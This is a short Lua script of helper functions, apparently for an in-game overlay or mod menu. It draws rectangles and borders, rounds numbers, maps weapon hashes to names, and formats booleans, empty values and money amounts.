function draw_rect(rect_x, rect_y, rect_w, rect_h, colour)
    directx.draw_rect(rect_x, rect_y, rect_w, rect_h, 
    {r = colour.r * colour.a, g = colour.g * colour.a, b = colour.b * colour.a, a = colour.a})
end

function draw_border(x, y, w, h)
    local borderx = borderwidth/aspectratio
    draw_rect(x - borderx, y, w + borderx * 2, -borderwidth, colour_map.border) --top
    draw_rect(x, y, -borderx, h, colour_map.border) --left
    draw_rect(x + w, y, borderx, h, colour_map.border) --right
    draw_rect(x - borderx, y + h, w + borderx * 2, borderwidth, colour_map.border) --bottom
end

--rounding function
function round(num, numDecimalPlaces)
    local mult = 10^(numDecimalPlaces or 0)
    return math.floor(num * mult + 0.5) / mult
end

--weapon function (from lance)
all_weapons = {}
local temp_weapons = util.get_weapons()
for a,b in pairs(temp_weapons) do
    all_weapons[#all_weapons + 1] = {hash = b['hash'], label_key = b['label_key']}
end
function weapon_from_hash(hash) 
    for k, v in pairs(all_weapons) do 
        if v.hash == hash then 
            return util.get_label_text(v.label_key)
        end
    end
    return 'Unarmed'
end

--boolean function
function boolean(bool)
    if bool then return 'Yes' else return 'No' end
end

--check function
function check(info)
    if info == '' or info == 0 or info == nil or info == 'NULL' then return 'None' else return info end 
end

--format money
function format_money(money_value)
    local order = math.ceil(string.len(tostring(money_value))/3 - 1)
    if order == 0 then return money_value end
    return round(money_value/(1000^order), 1)..({'K', 'M', 'B'})[order]
end

